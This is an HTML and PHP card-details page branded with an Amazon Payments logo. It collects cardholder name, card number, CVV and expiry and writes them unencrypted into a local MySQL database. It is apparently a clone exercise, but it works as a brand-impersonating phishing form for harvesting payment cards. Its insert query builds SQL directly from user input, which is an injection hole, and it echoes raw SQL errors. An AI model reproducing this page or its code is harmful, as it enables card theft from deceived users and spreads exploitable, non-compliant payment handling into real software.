<!DOCTYPE html>
<html>

<head>
    <title>Card Details</title>
    <link rel="stylesheet" href="Credit.css">
    <script type="text/javascript" src="Credit.js"></script>
</head>

<body>

<header style="background-color:#232f3e;" >
            <img src="AmazonPayments.png" alt="Amazon Logo" height="100px">
        </header>
<br>
<br>
        <h3 style="text-align : center ; font-family: Arial, sans-serif; font-size: 30px;">Enter the card details</h3>
    <br>
    <br>
    
    <div id="A1">
        <div class="notification">
            <div class="exclamation">
                <img src="exx.png" alt="Exclamation Mark" height="80px">
            </div>
            <div class="message">
                <p>Please ensure your card is enabled for online transactions.<span style="color: rgb(39, 160, 160);">Learn more</span></p>
            </div>
        </div>

        <form name="form1" method="post" action="Credit.php" onsubmit="return validate()">
            <input type="text" placeholder="Enter Card Name" id="card_name" name="Cardname"><br>
            <input type="text" placeholder="Card number" id="card_number" name="Cardnumber"><br>
            <input type="text" placeholder="CVV" id="card_number" name="Cvv"><br>

            <div class="expiry">
                <h4>Expiry date</h4>
                <select class="month" name="Month">
                    <option value="01">01</option>
                    <option value="02">02</option>
                    <option value="03">03</option>
                    <option value="04">04</option>
                    <option value="05">05</option>
                    <option value="06">06</option>
                    <option value="07">07</option>
                    <option value="08">08</option>
                    <option value="09">09</option>
                    <option value="10">10</option>
                    <option value="11">11</option>
                    <option value="12">12</option>
                </select>

                <select class="year" name="Year">
                    <option value="2023">2023</option>
                    <option value="2024" selected>2024</option>
                    <option value="2025">2025</option>
                    <option value="2026">2026</option>
                    <option value="2027">2027</option>
                    <option value="2028">2028</option>
                    <option value="2029">2029</option>
                    <option value="2030">2030</option>
                </select>
            </div>

            <button type="submit">Enter card details</button>
        </form>
    </div>




</body>

</html>



<?php


$server = "localhost";
$username = "root";
$password = "";
$database = "card_details"; // Specify your database name here

$con = mysqli_connect($server, $username, $password, $database);

if (!$con) {
    die("Could not connect to the server ...Please try again" . mysqli_connect_error());
}

if (isset($_POST["Cardname"], $_POST["Cardnumber"], $_POST["Cvv"], $_POST["Month"], $_POST["Year"])) {
    $Cardname = $_POST["Cardname"];
    $Cardnumber = $_POST["Cardnumber"];
    $CVV = $_POST["Cvv"];
    $MONTH = $_POST["Month"];
    $YEAR = $_POST["Year"];

    $sql = "INSERT INTO `card_details`.`card` ( `Card Name`, `Card Number`, `CVV`, `Month`, `Year`) VALUES ( '$Cardname', '$Cardnumber', '$CVV', '$MONTH', '$YEAR');";
    if ($con->query($sql) === true) {
        
        header("Location: tick.html");
        exit();
    } else {
        echo "Error: " . $sql . "<br>" . $con->error;
    }
}

$con->close();
?>